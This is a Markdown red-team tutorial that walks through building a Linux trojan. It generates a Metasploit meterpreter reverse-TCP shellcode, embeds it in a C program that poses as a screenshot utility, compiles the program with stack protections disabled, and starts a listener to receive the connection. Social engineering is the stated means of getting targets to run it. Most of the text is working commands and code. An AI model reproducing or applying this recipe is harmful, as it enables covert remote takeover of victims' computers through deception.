#### EXERCISE OBJECTIVES
Use Metasploit to build shellcode in C format, then embbeded it on a C program (RAT)<br />
to be abble to control of a linux system remotely using social engineering.

<br />

#### STEPS REQUIRED TO ACHIEVE THIS
[1º - Use Metasploit to Build Shellcode in C Format](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#use-metasploit-to-build-shellcode-in-c-format)<br />
[2º - Insert the C shellcode created into a C program](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#insert-the-c-shellcode-created-into-a-c-program)<br />
[3º - Use GCC to compile the C program (make it executable)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#use-gcc-to-compile-the-c-program-make-it-executable)<br />

<br />

#### SOCIAL ENGINEERING
**'Take a desktop screenshot using a C program'**.<br />
The C program not only runs the shellcode (RAM) that allows us to control the target PC remotely,<br />
but also executes a system command (sh) that takes a screenshot of the target PC desktop using<br />
[MITRE ATT&CK T1113](https://attack.mitre.org/techniques/T1113/) (xwd package) Technic. **'(Screenshot Function Inside the C Program)'**:<br />

    system("sleep 1; xwd -root -out /tmp/ScreenShot.xwd");

<br /><br />

| DEPENDENCIE | DESCRIPTION | FUNCTION | REQUIRED |
|---|---|---|---|
| Metasploit | Metasploit Framework | Build Shellcode + Recive Connection ( handler )| yes |
| [GCC](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) | C Compiler | Compile the C Program ( make it executable ) | yes |
| [xwd](http://blog.tordeu.com/?p=135) | X Window Screenshots | Take Screenshots ( social engineering ) | optional |


<br /><br />

#### SHELLCODING DESCRIPTION

<br /><br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-objectives)

---

### STEP-BY-STEP (HOW-TO)

<br /><br />

#### Build shellcode folder

```
sudo mkdir shellcode
cd shellcode
```

<br />

#### Start postgresql service

```
sudo service postgresql start
```

<br />

#### Use Metasploit to Build Shellcode in C Format

```
## Build raw shellcode in C
# WARNING: Replace LHOST value by your local ip address
# WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -b '\x00' -a x86 --platform linux -f c -o chars.raw

```

- **'Msfvenom Syntax'**
  - -p payload name
  - -b delete nul bites from shellcode
  - -a payload arch
  - -f payload format
  - -o write output to a file 

<br />

#### See whats written inside chars.raw (optional)

```
cat chars.raw
```

<br />

#### [Parse](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/bash/parsing_data_in_bash.md) shellcode data and store it into a local bash variable

```
pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
```

<br />

#### Insert the C shellcode created into a C program

```
echo "#include<stdio.h>" > payload.c
echo "#include<stdlib.h>" >> payload.c
echo "#include<string.h>" >> payload.c
echo "" >> payload.c
echo "unsigned char buf[] = \"$pa\";" >> payload.c
echo "" >> payload.c
echo "int main()" >> payload.c
echo "{" >> payload.c
echo "  printf(\"[i] Please Wait, Taking Screenshot ..\");" >> payload.c
echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
echo "  printf(\"[i] Screenshot Stored Under: /tmp/ScreenShot.xwd\");" >> payload.c
echo "  system(\"sleep 1; xwud /tmp/ScreenShot.xwd\");" >> payload.c
echo "  void (*ret)() = (void(*)())buf;" >> payload.c
echo "  ret();" >> payload.c
echo "}" >> payload.c
```

<br />

#### See whats written inside payload.c (optional)

```
cat payload.c
```

<br />

#### Use GCC to compile the C program (make it executable)

```
sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
```

<br />

#### Start metasploit multi handler

```
# WARNING: Replace LHOST value by your local ip address
# WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
```

<br />

#### Execute the C Program (remote machine)

```
chmod +x desktop_screenshot
sudo ./desktop_screenshot
```

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-objectives)

---

<br />

#### Video Tutorial

[C Shellcode Linux - Video Tutorial](https://blablabla.)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-objectives)

---

### Suspiciou Shell Activity - RedTeam @2019


